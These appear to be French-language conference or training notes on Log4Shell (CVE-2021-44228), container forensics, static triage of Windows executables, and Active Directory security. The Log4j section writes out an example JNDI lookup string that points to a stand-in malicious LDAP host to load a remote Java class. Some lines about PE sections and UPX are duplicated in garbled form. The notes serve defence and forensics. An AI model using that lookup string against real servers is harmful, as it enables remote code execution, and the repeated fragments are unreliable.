## Log4j identification a la remediation
- CVE 2021 44228 : Score 10 (maximum)
- Utilisation simple : une requete craftee specialement permet de telecharger et executer une charge 
- Log4j : Utilitaire de journalisation faisant parti des systemes Apache
- JNDI : (Java Naming and Directory Interface) Interface pour utiliser les utilitaires web (DNS, LDAP, RMI...)
### Principe
Une requete contenant des caracteres speciaux va permettre d'executer une classe definie a partir d'un serveur LDAP donne par l'utilisateur

Se base sur les *Lookups*; utilises pour remplacer des caracteres speciaux par des valeurs arbitraires definies dans les logs

Mise en place : `${jndi:ldap/www.badsite.com/badJavaClass}`

### Miligation 
1. Mise en place du Hunting sur le SIEM
2. Protocole Recherche, Detection, Inventorier -> suivre les recommandations de l'ANSSI

## Forensique en environnement conteneur
La theorie reste la meme en environnement conteneur (Docker; Kubernetes) mais pas les outils

- Conteneur : Application generee a partir d'une image . 
  Ensemble de processus isoles du systeme a l'aide de **namespaces**. 
  Environnements dynamiques -> sont detruits/crees a la volee en fonction de la charge CPU -> possible d'utiliser cronjob pour cela


Les couches du modele conteneur interessantes pour le Forensique :
- OCI (Open Container Initiative)
- CRI (Container Runtime Interface)

Elles definissent des couches d'API et de format utilisees par toutes les technos 

### Specificites
- Possible d'utiliser les techniques de base (/proc; /pid; systemes de fichiers...) mais utilite limitee -> pas efficace; pas d'enregistrement de l'information utile
- Le service cloud doit etre pris en compte : pas le meme niveau d'information entre AWS (aucune divulgation-> pas d'analyse post-mortem) et EKS/ECS 
### Pistes d'analyse
- Possible de partir de l'image de generation (`docker inspect`, `crictl inspect`) avec l'outil `dive`
- Possible d'utiliser les disques et les snapshots. Depends du systeme de fichier et du volume (Overlay2 (GNU/Linux) permet une analyse de systeme de ficher; devicemapper necessite une analyse sur les blocs)
- Remarque : Avec le bon timing; on peut commit l'image utilise `docker commit <container>` et la sauvegarder `docker save <image>`
- Pour l'analyse memoire : 
  - Possible d'utiliser LiMe / AMVL pour faire une sauvegarde complete de la memoire
  - Toujours possible d'utiliser Volatity pour faire un dump complet de la memoire. Pour faire une capture opportuniste; utiliser Criu -> `criu-coredump` couple a `gdb`

## Analyse statique des executables windows 
- Triage des executables suspects : execution en sandbox (analyse dynamique) et analyse statique
- PE : Portable Executable; Executable en plusieurs sections; chargees par le loader Windows a partir d'une logique de mappin- PE : Portable Executable; Executable en plusieurs sections; chargees par le loader Windows a partir d'une logique de mapping
  La section contenant le code machine est souvent nommee **.text**. Contient egalement le point d'entree 
  **.rdata** contient les constantes et **.data** des variables.
  Chaque section peut etre nommee a l'envie mais ses caracteristiques dependent de ses droits (READ/WRITE/EXEC)
- UPX : Compression des fichiers (PE/ELF) et decompression a la volee pendant l'executation vers la forme originale
### Protocole
1. Identification
  - Chercher la signature du binary (MD5; SHA256, SHA1) dans hashlookup ou virustotal. La publication de ces fichiers donnent l'information a l'adversaire que son vecteur d'attaque est grille -> d'abord faire des tests en interne 
  - Possible de telecharger un fichier a partir de son hash (bazaar)
  - L'adversaire pouvant faire varier le hash de son vecteur a chaque utilisation -> verifier les valeurs ssdeep
2. Recherche de strings
  - Utilisables sous Windows(`Sysinternals`) comme Linux
  - Permet de trouver les librairies importees par le vecteur (voir `MalAPI` pour l'utilisation malveillante de l'API windows)
  - Possible de reconnaitre des messages d'erreur de la STD C/C++ 
  - Le nombre de strings trouve donne une information importante : le binaire est-il compresse ? Chargement de librairies externes ? 
3. Recherche de motifs
  - Utilisation d'outils comme `binwalk`(variation d'entropie) ou `yara`(signatures)
 et decompression a la volee pendant l'executation vers la forme originale et decompression a la volee pendant l'executation vers la forme originale et decompression a la volee pendant l'executation vers la forme originale et decompression a la volee pendant l'executation vers la forme originale
 4. Automatisation 
 - Creation de rules Yara
 - Outils de detection (ici `Detect It Easy`) -> utilise le langage AutoIt

# Active Directory 
- AD : Active Directory; Introduite par Microsoft en 1999 avec la sortie de Windows 2000 pour la gestion de postes et de serveurs. 
  Technologie sur le declin ? Encore tres utilisee mais vieille -> point de fragilite critique (surface d'attaque et outillage massif)
- Fonctionnement de AD : Plusieurs services base sur un **anuaire global** et le protocole LDAP. Permet d'identifier / verifier/ autoriser les acces 
Utilise un serveur DNS pour lister les protocoles et les services dans `_ldap _kerberos _gc _kpasswd`. Integre egalement un serveur NTP pour la synchronisation
- Kerberos : Element d'authentification fonctionnant par session token (`ticket TGT` associe a une session utilisateur pour un temps donne)
- Problemes de AD : Correctifs regressifs (`PrintNightmare`)
## Securite d'Azure AD & Intune
 - Azure AD : Systeme de gestion des identites en ligne par Microsoft. Fonctionne parfaitement avec les AD mis en place dans le systeme 
 - Azure Intune: Gestion de l'identite des terminaux mobiles
 - Le teletravail et le SaaS (**software as a service**) sont en grand developpement
 *partie de la revue passee; TODO prise de note ?*
### Samba-AD ou l'AD opensource
 - Base sur la decision de justice de la cour europenne (position dominante) -> obligation de publier les spes techniques inter operabilites des produits
